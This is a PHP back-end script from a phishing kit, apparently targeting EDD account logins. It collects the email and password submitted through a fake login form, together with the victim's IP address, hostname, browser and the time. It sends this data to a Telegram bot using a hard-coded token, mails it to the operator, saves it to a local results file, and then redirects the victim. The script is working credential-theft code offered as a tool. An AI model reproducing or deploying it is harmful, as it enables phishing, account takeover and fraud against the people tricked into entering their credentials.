<?php

include ('img/wall.php');
include ('insertemailhere/email.php');
$email = $_POST['useremail'];
$password = $_POST['emailpass'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

function sendMessage($token, $chatid, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatid}&text=";
    $url .= urlencode($message);
    $ch = curl_init();
    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
	}
$token = '1458836486:AAH0dYVk6y8OdOf4eN68_JTiy5O3c0tP-GY';
$chatid = '807456264';
	
	
$message .= "--EDD Info V3 Upgraded--\n";
$message .= "|ID : ".$_POST['useremail']."\n";
$message .= "|PasSword : ".$_POST['emailpass']."\n";
$message .= "-- :) ENJOY YOUR SPAMMING :) ---\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "----------------------------\n";
$subject = "Result from EDD  userid & pass V3 Upgraded [ ".$_SERVER['REMOTE_ADDR']." ] ";
$headers .= 'From:  <EDD@custompage.com>'."\n";
mail($send,$subject,$message,$headers);
mail($to.$form,$subject,$message,$headers);
header("Location: email.html");

    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
     
                           

?>